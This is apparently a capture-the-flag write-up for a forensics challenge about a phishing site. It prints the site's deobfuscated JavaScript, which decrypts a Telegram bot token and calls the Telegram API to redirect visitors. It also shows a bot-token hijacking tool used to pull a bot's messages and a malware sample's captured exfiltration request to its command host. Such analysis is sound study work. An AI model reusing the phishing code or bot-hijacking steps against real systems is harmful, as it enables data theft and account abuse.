# Challenge description

In Eldoria, a once-innocent website called “Tales for the Brave” has become the focus of unsettling rumors. Some claim it may secretly trap unsuspecting visitors, leading them into a complex phishing scheme. Investigators report signs of encrypted communications and stealthy data collection beneath its friendly exterior. You must uncover the truth, and protect Eldoria from a growing threat.
**When debugging JavaScript, ensure you use a Firefox-based browser.**

# To specify

Challenge made with the help of [Samir](https://github.com/Samir0x20) and [Seahorse Raiser](https://github.com/arthurco).

# Soluce

## Step 1: Investigate the Website

When you open the website, you can see an obfuscated JavaScript code. You can deobfuscate it using the following script: [decode.js](code/decode.js).

Here is the result:

```javascript
┌──(env)(virgile㉿localhost)-[~/Téléchargements/site]
└─$ node decode.js
var _$_8b18 = (function (k, j) { var y = k.length; var o = []; for (var m = 0; m < y; m++) { o[m] = k.charAt(m) }; for (var m = 0; m < y; m++) { var b = j * (m + 143) + (j % 34726); var r = j * (m + 91) + (j % 23714); var v = b % y; var s = r % y; var f = o[v]; o[v] = o[s]; o[s] = f; j = (b + r) % 4449625 }; var a = String.fromCharCode(127); var i = ''; var e = '\x25'; var q = '\x23\x31'; var t = '\x25'; var h = '\x23\x30'; var w = '\x23'; return o.join(i).split(e).join(a).split(q).join(t).split(h).join(w).split(a) })('shfnemBLlerpitrtgt%ld%DmvuFeceaEaladerletdtdtsputpnielEvae%%iansn%eimkei%guLt%d%i%tsv%ds%eltee%ewssmnnvdsaiyrroeesmlc@Feroieoel%bt%lIota', 3827531); document[_$_8b18[3]](_$_8b18[14])[_$_8b18[13]](_$_8b18[0], function (e) { e[_$_8b18[1]](); const emailField = document[_$_8b18[3]](_$_8b18[2]); const descriptionField = document[_$_8b18[3]](_$_8b18[4]); let isValid = true; if (!emailField[_$_8b18[5]]) { emailField[_$_8b18[8]][_$_8b18[7]](_$_8b18[6]); isValid = false; setTimeout(() => { return emailField[_$_8b18[8]][_$_8b18[9]](_$_8b18[6]) }, 500) }; if (!isValid) { return }; const emailValue = emailField[_$_8b18[5]]; const specialKey = emailValue[_$_8b18[11]](_$_8b18[10])[0]; const desc = parseInt(descriptionField[_$_8b18[5]], 10); f(specialKey, desc) });;function G(r) { return function () { var r = Array.prototype.slice.call(arguments), o = r.shift(); return r.reverse().map(function (r, t) { return String.fromCharCode(r - o - 7 - t) }).join('') }(43, 106, 167, 103, 163, 98) + 1354343..toString(36).toLowerCase() + 21..toString(36).toLowerCase().split('').map(function (r) { return String.fromCharCode(r.charCodeAt() + -13) }).join('') + 4..toString(36).toLowerCase() + 32..toString(36).toLowerCase().split('').map(function (r) { return String.fromCharCode(r.charCodeAt() + -39) }).join('') + 381..toString(36).toLowerCase().split('').map(function (r) { return String.fromCharCode(r.charCodeAt() + -13) }).join('') + function () { var r = Array.prototype.slice.call(arguments), o = r.shift(); return r.reverse().map(function (r, t) { return String.fromCharCode(r - o - 60 - t) }).join('') }(42, 216, 153, 153, 213, 187) };var _$_5975 = (function (o, u) { var g = o.length; var t = []; for (var w = 0; w < g; w++) { t[w] = o.charAt(w) }; for (var w = 0; w < g; w++) { var z = u * (w + 340) + (u % 19375); var a = u * (w + 556) + (u % 18726); var h = z % g; var q = a % g; var b = t[h]; t[h] = t[q]; t[q] = b; u = (z + a) % 5939310 }; var k = String.fromCharCode(127); var r = ''; var l = '\x25'; var i = '\x23\x31'; var v = '\x25'; var e = '\x23\x30'; var f = '\x23'; return t.join(r).split(l).join(k).split(i).join(v).split(e).join(f).split(k) })('%dimfT%mVlzx%degpatf5bfnrG%6tSiqth5at%easpi0emILmcim%e%/!=eZtnHf%e7cf+3rstO%%.D0i8p3t/Sphryoa%IL0rin%rcAeF6%nsenoYaLeQ5Natp4CrSrCGttUtZrdG%rlxe2poa2rdg=9fQs%&j_of0ButCO tb=r35DyCee8tgaCf=I=%rAQa4fe%ar0aonsGT_v/NgoPouP2%eoe%ue3tl&enTceynCtt4FBs%s/rBsAUEhradnkrstfgd?%t%xeyhcedeTo%olghXMsaocrB3aaDBr5rRa16Cjuct%cOee5lWE_ooo+Ka4%d3TysnehshstepId%%Ieoaycug:i_m=%%mjp0tgaiidoei.prn%sw1d', 4129280); function f(oferkfer, icd) { const channel_id = -1002496072246; var enc_token = _$_5975[0]; if (oferkfer === G(_$_5975[1]) && CryptoJS[_$_5975[7]](sequence[_$_5975[6]](_$_5975[5]))[_$_5975[4]](CryptoJS[_$_5975[3]][_$_5975[2]]) === _$_5975[8]) { var decrypted = CryptoJS[_$_5975[12]][_$_5975[11]](enc_token, CryptoJS[_$_5975[3]][_$_5975[9]][_$_5975[10]](oferkfer), { drop: 192 })[_$_5975[4]](CryptoJS[_$_5975[3]][_$_5975[9]]); var HOST = _$_5975[13] + String[_$_5975[14]](0x2f) + String[_$_5975[14]](0x62) + String[_$_5975[14]](0x6f) + String[_$_5975[14]](0x74) + decrypted; var xhr = new XMLHttpRequest(); xhr[_$_5975[15]] = function () { if (xhr[_$_5975[16]] == XMLHttpRequest[_$_5975[17]]) { const resp = JSON[_$_5975[10]](xhr[_$_5975[18]]); try { const link = resp[_$_5975[20]][_$_5975[19]]; window[_$_5975[23]][_$_5975[22]](link) } catch (error) { alert(_$_5975[24]) } } }; xhr[_$_5975[29]](_$_5975[25], HOST + String[_$_5975[14]](0x2f) + _$_5975[26] + icd + _$_5975[27] + channel_id + _$_5975[28]); xhr[_$_5975[30]](null) } else { alert(_$_5975[24]) } };;var sequence = [];;function l() { sequence.push(this.id); };;var _$_ead6 = ['\x69\x6E\x70\x75\x74\x5B\x63\x6C\x61\x73\x73\x3D\x63\x62\x5D', '\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C', '\x6C\x65\x6E\x67\x74\x68', '\x63\x68\x61\x6E\x67\x65', '\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72']; var checkboxes = document[_$_ead6[1]](_$_ead6[0]); for (var i = 0; i < checkboxes[_$_ead6[2]]; i++) { checkboxes[i][_$_ead6[4]](_$_ead6[3], l) }
```

Making it "pretty print", and replacing the variables that serve to hide the function of the code, we obtain the following code:

```javascript
document["getElementById"]("newsletterForm")["addEventListener"]("submit", function(e) {
    e["preventDefault"]();
    const emailField = document["getElementById"]("email");
    const descriptionField = document["getElementById"]("descriptionField");

    let isValid = true;
    if (!emailField["value"]) {
        emailField["classList"]["add"]("shake");
        isValid = false;
        setTimeout(() => {
            return emailField["classList"]["remove"]("shake")
        }, 500)
    };
    if (!isValid) {
        return
    };
    const emailValue = emailField["value"];
    const specialKey = emailValue["split"]("@")[0];
    const desc = parseInt(descriptionField["value"], 10);
    
    f(specialKey, desc)
});;

function G(r) {
    return function() {
        var r = Array.prototype.slice.call(arguments),
            o = r.shift();
        return r.reverse().map(function(r, t) {
            return String.fromCharCode(r - o - 7 - t)
        }).join('')
    }(43, 106, 167, 103, 163, 98) + 1354343..toString(36).toLowerCase() + 21..toString(36).toLowerCase().split('').map(function(r) {
        return String.fromCharCode(r.charCodeAt() + -13)
    }).join('') + 4..toString(36).toLowerCase() + 32..toString(36).toLowerCase().split('').map(function(r) {
        return String.fromCharCode(r.charCodeAt() + -39)
    }).join('') + 381..toString(36).toLowerCase().split('').map(function(r) {
        return String.fromCharCode(r.charCodeAt() + -13)
    }).join('') + function() {
        var r = Array.prototype.slice.call(arguments),
            o = r.shift();
        return r.reverse().map(function(r, t) {
            return String.fromCharCode(r - o - 60 - t)
        }).join('')
    }(42, 216, 153, 153, 213, 187)
};

function f(oferkfer, icd) {
    const channel_id = -1002496072246;
    var enc_token = "nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==";
    if (oferkfer === G("s3cur3k3y") && CryptoJS["SHA256"](sequence["join"](""))["toString"](CryptoJS["enc"]["Base64"]) === "18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=") {
        var decrypted = CryptoJS["RC4Drop"]["decrypt"](enc_token, CryptoJS["enc"]["Utf8"]["parse"](oferkfer), {
            drop: 192
        })["toString"](CryptoJS["enc"]["Utf8"]);
        var HOST = "https://api.telegram.org" + String["fromCharCode"](0x2f) + String["fromCharCode"](0x62) + String["fromCharCode"](0x6f) + String["fromCharCode"](0x74) + decrypted;
        var xhr = new XMLHttpRequest();
        xhr["onreadystatechange"] = function() {
            if (xhr["readyState"] == XMLHttpRequest["DONE"]) {
                const resp = JSON["parse"](xhr["responseText"]);
                try {
                    const link = resp["result"]["text"];
                    window["location"]["replace"](link)
                } catch (error) {
                    alert("Form submitted!")
                }
            }
        };
        xhr["open"]("GET", HOST + String["fromCharCode"](0x2f) + "forwardMessage?chat_id=" + icd + "&from_chat_id=" + channel_id + "&message_id=5");
        xhr["send"](null)
    } else {
        alert("Form submitted!")
    }
};;
var sequence = [];;

function l() {
    sequence.push(this.id);
};;

var checkboxes = document["querySelectorAll"]("input[class=cb]");
for (var i = 0; i < checkboxes["length"]; i++) {
    checkboxes[i]["addEventListener"]("change", l)
}
```

The code is a form that sends a message to a telegram bot. To send a message, there is two conditions:
- The email first part (before the @) must be equal to G("s3cur3k3y") --> "0p3r4t10n_4PT_Un10n" (you can find it by `console.log(G("s3cur3k3y"))`).
- The SHA256 of the sequence of the checkboxes must be equal to "18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=".

For the second condition, we need to bruteforce the sequence of the checkboxes to find the correct one. We can do it with the following script: [bruteforce.js](code/bruteforce.js).

```javascript
┌──(virgile㉿localhost)-[~/Téléchargements/site]
└─$ node bruteforce.js
Found : [
  'c4', 'c2', 'c2',
  'c2', 'c1', 'c3',
  'c4', 'c1'
] -> 18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=
```

So you have to click in the following order: 4, 2, 2, 2, 1, 3, 4, 1.

With all of that, this build the following request: `https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/forwardMessage?chat_id=<chat_id>&from_chat_id=-1002496072246&message_id=5`.
The description field gives the chat id to the GET request. So you have to put the chat id in the description field. But we don't know the chat id of the telegram bot.

## Step 2: Find the chat id 

To find a chat id with a telegram bot, you can read the following article:
https://gist.github.com/nafiesl/4ad622f344cd1dc3bb1ecbe468ff9f8a

So, the website tells us to check this link:
https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/getUpdates

On this link, you can see the [getUpdates.json](code/getUpdates.json) file. You can see the chat id of the bot: -1002516009982 (on `result.0.channel_post.chat.id`).

## Step 3: retrieve bot conversation 

When you put the chat id in the description field, it send you an invitation link to a group chat, but the link is not valid. So you have to get messages from the bot without being in the group chat.

We will use the following tool: https://github.com/0x6rss/matkap

```sh
# Clone the repository
git clone https://github.com/0x6rss/matkap.git

# Navigate into the project folder
cd matkap

# Create and fill out your .env file 
# with TELEGRAM_API_ID, TELEGRAM_API_HASH, TELEGRAM_PHONE 

# Install dependencies
pip install -r requirements.txt

# Run Matkap
python matkap.py
```

For the .env, you have to create an application on https://my.telegram.org/apps and fill the .env file with the following information:
- TELEGRAM_API_ID: the api_id of the application
- TELEGRAM_API_HASH: the api_hash of the application
- TELEGRAM_PHONE: your phone number

After the `python matkap.py` command, it will open the application.

![alt text](media/image-1.png)

You have to put the the bot token in the `Bot Token` field and the chat id in the `Chat ID` field.

Then click on `Start Attack`, it will ask you an authorization code (sent on your telegram account) to fill in the terminal. After that, click on `Forward All Messages`. It will send you all the messages of the bot on your telegram account.

![alt text](media/image-2.png)

So you can download the `Brave.zip` file and extract it with the given password: `dr4g0nsh34rtb3l0ngst0m4l4k4r`.

## Step 4: analyze the content of Brave.exe

Given the malware description given on Telegram, we suspect the virus will send data externally. So, we'll download the Brave browser, launch the virus in a Windows VM, and open Wireshark to analyze what's happening.

We see that our computer is sending suspicious requests to: `zOlsc2S65u.htb:31337`. So we will edit our hosts file to redirect this domain to our local machine.

On windows, the `C:\Windows\System32\drivers\etc\hosts` file is the one to edit. You can add the following line at the end of the file:

```
127.0.0.1 zOlsc2S65u.htb
```

Then, we can launch a simple HTTP server with the following command:

```sh
python3 -m http.server 31337
```

Now we can launch Wireshark and listen on the `Adapter for loopback traffic capture` interface and launch the malware. We can see a TCP stream with the following content:

```http
POST / HTTP/1.1
Accept: */*
Content-Type: application/json
Authorization: Bearer Token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcm9tIjoiY29zdGkiLCJjYW1wYWlnbl9pZCI6Ik9wZXJhdGlvbiBFbGRvcmlhIDogRXhwb3NpbmcgdGhlIGJyYXZlcyIsImF1dGgiOiJVMFpTUTJVd1JsRldSamxxVFVjMWVtTkVSbmxPUjAxNFRUTk9abGxxVG05TlZ6VnJXREpKZW1KcVJtNWliRGx6VFVSQ2NrMVhOVzVZTTAxNFpFUk9lbVpSUFQwPSJ9.HelK5pTs6fenv8TKmAPrV3tzhSZm4GEAnEV9vBBtAzg
Content-Length: 2812
User-Agent: Mozilla/5.0 (compatible;MSIE 7.0;Windows;Windows NT 6.3;Win64;x64 Trident/4.0)
Host: zOlsc2S65u.htb:31337
Connection: Close
Cache-Control: no-cache

{"n":0,"fid":"0","d":"Q6w5ru5OryGSuL4mFZt4jTBkUl2ukYm9tSmYlz4tOcppIy\u002BcMcr43Es3IIOhqWPSU0OlAIejXQi\u002BAbnQhHAlb5QwWbW1a7Q96qBteuaCtKNLI83twvSWYUF7MIy8qOGCjBskxKtKCw0hh97YEBlg/OtnhTcdoTHvU3zKLyTsrA0f4mtgVZYcLiWKAb5HBFWhqIFFH6Kw7HL9kIidwD\u002BVX1FJZPlIHI1aRawptYM/lcbpRAaUhelwUIftH14eTOvG0F\u002B/Iv2F30UWKiclxVRkWeFe1ynyE2MjsZieVmKazb0WHyOPI4nJ22wE8O8X13yD3wJrsskWCLo0ur1aw\u002BMt96qOgwaDq1kwoJh4wlBOs9hE0ts9kXHaAmiRDlmVMPKtw04X/ktQ6YVz4MBRDzEWhiElDV5bYO2OEY2TmYEaZahX1LEveHTCyHMXvsQqZFE0J0ITDnO7w3THkKKXlchh26nrrenkRwTZLW2vJKvoSlqJVODWeB/bD2h01s4Jj3rH\u002BfAWKt0FEj/83DKMbHtu0fSlOQBukr7iwT7BVzV9MoHKbI7n1Zu1Af4s0CgL52Z7v\u002BSuMHivNnDxb6zA5NuWeksyuUosEdrORbe1I/3tXZJUQLvKYukY9cN9qYiTyGxUgfwO6qnPUAuY/7H0OtQk3euWFe7oACOupVVyO/WKtzC/FGZwPYcZtVrJbmChFW3ny1cj1vKT9t9ekgb5CI/OmOn/EmgUQUEUa\u002BXxY7jKFsGlqTam9BVpmyEz/TPDogV6/m6U7E6LN0iurcsldaLnyTAydPh19AYui5pBQKLe4owXKGtyqW7e4byyiot8vIFMVEQw0\u002B0tegbVgB6laEph95pjnUSiDpuA1GAWkFMjaEh/D3wmdFXU\u002BI3XQlhrvBHFZdI2D/Rnm6vG4yY9wicNkKe9jlHM8wuvA62xicwgmDxdnaCZVK3NFf\u002B8L9WJJ3Vxb1OcnJJDMwhM4kkoE2Kw94TFZShtHH\u002BWCUMnef9g\u002BGBdG3yK5TKWMtluScL6j5PhQh7BHJGPkBd/SJ\u002B9OlF\u002BVGOcCWLJCvVIgiR0RWhNH5mfPWLj0LrD3Iyg8MoJ4nNW9sC8m1eokrTDLdZH2ddNkQNX62wERne2rXemRKusN7/p1NgXtcRj6IoiUoGhNh29tgchWJLzRvoZmWc9igyPDJJn\u002BxRtDh\u002BQ\u002BRozPaGjeQQ/bDBINXWFuIMRZnMgJzh35gJW3b\u002BbApyZkgDqeKi0obYmBUG5ELL5pfvBmVnQosgSc1/lKn\u002BOpa2qiICvgbQQCjl\u002BKwqLzPuvyeEnqBarn3WWwkMbXyUt3v6X9SIqST8UtbpHN9GNY/omJEqUVrZmx6Ne/sqgahmvjhUTNGOPV\u002BCXCXLg/8d72Mm/Fveajo0jSpjRPCX2TNA\u002BD7qaC4UPzg7CbW6/fQxy2NAbbU9O4DhMz41NB7VLi4oKDgVybjCst1gi4ETOojZNFKuUS8wYYXHSCTuwP2IclywdMaMeNrWNFmHoGoOuh7Xx13pLE2xqB4PGYNyVT5GdC5R5MLp5E7RYKpZplu6QqJMeRWI7N8kEnhSs429x5Uh5iCBdPGPp2X/O\u002BKIp4CWk7CMItt2/0staDc420cQj0gIo12sEe/lxFBKzLGsLdG1N2FyBoWEsqNtGLuViLmA8UC2zmUoAQcKtTZa9JIlhnMnJc6C7wvp78wFFbLC\u002B173Iizxvz04hxGONiUZkvf9RcRZ405WtjAwgyApjbH36lJrzO3aZar36fWm8hqdQ89dwp9YYCAnCSwD\u002BlvVAaoBGjgutkWPwB92Jb/aSZsYMV3GNjn0tQTYRqX4aFWBqBI0XIgj4mklaEZrPUck1yudRJ9RR4D/mBukEDqmYDv2vxjXH7cHQzNaIJolvLH0FUrZ6Lbb2rl\u002Bo2PBJJkP7afR\u002B70PDXwA\u002B0EOnC6y1fMpbF0gcChASqKuI1krx5eVsjjuFVgx5ryk8TGATyLJnyxzdqogLAUv1qWV3Uo2kmEbd/L0BkMmwwvoctVhr\u002BZqu3YNZ9KnZxqZLkZaHZm6PoitDZlrb8mNg0rK\u002BT0taxLM00u7QtogiPhj0nbKyg1vd9IWThbHMsRU6tQuwAf9EO13QyR1fxQJgClx\u002Ba\u002B9/13caKSeBouFaFS/DXc7TU0JryhRakEId2nEqv6S9GuQ5AR2iZXkiPQPED3KvJlCyk6aKEiuPJjS9R9CDogdav8EXUIcyOJEPBWc\u002BFCiiOwNJhdGhekuVxE\u002BzGu8F1ren4QfxavII2bMq4SedCHZDEToFNFhlvBDsR0LXGwE4li1njRBizNF5GZEBnAeBO4u9DxGP5mZAgbepjwGg8/xsED\u002BgLCstVZa9UO3msLVclL1FTtrGTITIgNyepsmZh4Dg4Vh/YzSRYFvxDCWv\u002BkQtdCaqsIIezppLezOPp2sTM8sV1HwyHyolhQ7bpcrdQbpqzAfFNKqIEA2UZ4D3\u002BIroMiw32OHYgdxtacRHffPVJM7YQDbWpSkCelDJ1Vj6brAOEboXMLf33UhoFi2Hy5sySELD\u002BHC2BuPX72LVgd33yy5G2VxpOXkoQykOEebcwCR0bX\u002B/iDLR8r6wlXGfE9M="}
HTTP/1.0 501 Unsupported method ('POST')
Server: SimpleHTTP/0.6 Python/3.13.2
Date: Tue, 25 Mar 2025 17:24:44 GMT
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 357

<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 501</p>
        <p>Message: Unsupported method ('POST').</p>
        <p>Error code explanation: 501 - Server does not support this operation.</p>
    </body>
</html>
```

You can take the token and decode it with jwt.io: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcm9tIjoiY29zdGkiLCJjYW1wYWlnbl9pZCI6Ik9wZXJhdGlvbiBFbGRvcmlhIDogRXhwb3NpbmcgdGhlIGJyYXZlcyIsImF1dGgiOiJVMFpTUTJVd1JsRldSamxxVFVjMWVtTkVSbmxPUjAxNFRUTk9abGxxVG05TlZ6VnJXREpKZW1KcVJtNWliRGx6VFVSQ2NrMVhOVzVZTTAxNFpFUk9lbVpSUFQwPSJ9.HelK5pTs6fenv8TKmAPrV3tzhSZm4GEAnEV9vBBtAzg

![alt text](media/image.png)

We can see a base64 encoded text in the payload: `U0ZSQ2UwRlFWRjlqTUc1emNERnlOR014TTNOZllqTm9NVzVrWDJJemJqRm5ibDlzTURCck1XNW5YM014ZEROemZRPT0=`.

```sh
┌──(env)(virgile㉿localhost)-[~/Téléchargements/site]
└─$ echo "U0ZSQ2UwRlFWRjlqTUc1emNERnlOR014TTNOZllqTm9NVzVrWDJJemJqRm5ibDlzTURCck1XNW5YM014ZEROemZRPT0=" | base64 -d                                                                                                                        
SFRCe0FQVF9jMG5zcDFyNGMxM3NfYjNoMW5kX2IzbjFnbl9sMDBrMW5nX3MxdDNzfQ==
```

It gives us: `SFRCe0FQVF9jMG5zcDFyNGMxM3NfYjNoMW5kX2IzbjFnbl9sMDBrMW5nX3MxdDNzfQ==`

```sh
┌──(env)(virgile㉿localhost)-[~/Téléchargements/site]
└─$ echo "SFRCe0FQVF9jMG5zcDFyNGMxM3NfYjNoMW5kX2IzbjFnbl9sMDBrMW5nX3MxdDNzfQ==" | base64 -d
HTB{APT_c0nsp1r4c13s_b3h1nd_b3n1gn_l00k1ng_s1t3s}
```

And decoding it again gives us: `HTB{APT_c0nsp1r4c13s_b3h1nd_b3n1gn_l00k1ng_s1t3s}`
